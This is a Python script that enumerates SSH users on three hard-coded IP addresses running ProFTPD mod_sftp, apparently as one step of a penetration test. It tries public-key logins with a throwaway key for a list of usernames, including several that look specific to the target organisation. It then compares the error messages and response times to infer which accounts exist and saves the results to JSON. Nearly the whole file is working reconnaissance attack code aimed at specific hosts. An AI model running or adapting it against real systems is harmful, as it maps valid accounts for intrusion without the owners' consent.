#!/usr/bin/env python3
"""Test 2: SSH User Enumeration via Public Key Auth
ProFTPD mod_sftp may return different error messages or timing
for existing vs non-existing users during publickey auth attempts."""

import time
import socket
import json
import os
import tempfile

TARGETS = ["120.133.131.108", "120.133.131.109", "120.133.131.110"]
PORT = 22
TIMEOUT = 10

TEST_USERS = [
    "finance", "ops", "tms_cmb", "mms_cmb",
    "farms_warn_ruisuiyh", "farms_warn_dongyayh",
    "root", "admin", "ftp", "anonymous", "nobody",
    "proftpd", "sftp",
    "xyz_random_test_99", "definitely_not_a_user",
]


def enumerate_users(target: str) -> dict:
    import paramiko

    result = {"target": target, "results": {}, "timing": {}}

    fake_key = paramiko.RSAKey.generate(2048)
    key_path = os.path.join(tempfile.gettempdir(), "task1_enum_fake_key")
    fake_key.write_private_key_file(key_path)

    for user in TEST_USERS:
        start = time.time()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target, port=PORT, timeout=TIMEOUT,
                           username=user, key_filename=key_path,
                           look_for_keys=False, allow_agent=False)
            elapsed = time.time() - start
            result["results"][user] = "CONNECTION SUCCEEDED"
            result["timing"][user] = round(elapsed, 3)
        except paramiko.AuthenticationException as e:
            elapsed = time.time() - start
            result["results"][user] = str(e)[:200]
            result["timing"][user] = round(elapsed, 3)
        except Exception as e:
            elapsed = time.time() - start
            result["results"][user] = f"other: {str(e)[:100]}"
            result["timing"][user] = round(elapsed, 3)
        try:
            client.close()
        except:
            pass

    try:
        os.unlink(key_path)
    except:
        pass
    return result


def analyze(result: dict) -> dict:
    msg_groups = {}
    for user, msg in result["results"].items():
        norm = msg.lower().strip()
        msg_groups.setdefault(norm, []).append(user)
    enum_possible = len(msg_groups) > 1
    timings = result.get("timing", {})
    slow = [u for u, t in timings.items() if t > 3.0]
    fast = [u for u, t in timings.items() if t < 0.5]
    if slow and fast:
        enum_possible = True
    return {"msg_groups": msg_groups, "enum_possible": enum_possible,
            "slow_users": slow, "fast_users": fast}


def main():
    print("=== Test 2: SSH User Enumeration via Public Key Auth ===")
    all_results = {}
    for target in TARGETS:
        print(f"\nEnumerating {target}...")
        result = enumerate_users(target)
        a = analyze(result)
        print(f"  Message types: {len(a['msg_groups'])}, enum possible: {a['enum_possible']}")
        for user in sorted(result["results"]):
            t = result["timing"].get(user, "?")
            print(f"    {user} ({t}s): {result['results'][user][:80]}")
        all_results[target] = {"raw": result, "analysis": a}

    out = os.path.abspath(os.path.join(os.path.dirname(__file__),
        "..", "..", "task1", "TOOLS", "json", "task1_enum_probe.json"))
    with open(out, "w") as f:
        json.dump(all_results, f, ensure_ascii=False, indent=2)
    print(f"\nSaved to {out}")

    if any(r["analysis"]["enum_possible"] for r in all_results.values()):
        print("\n!!! ENUMERATION POSSIBLE !!!")
    else:
        print("\nEnumeration not possible: identical responses.")


if __name__ == "__main__":
    main()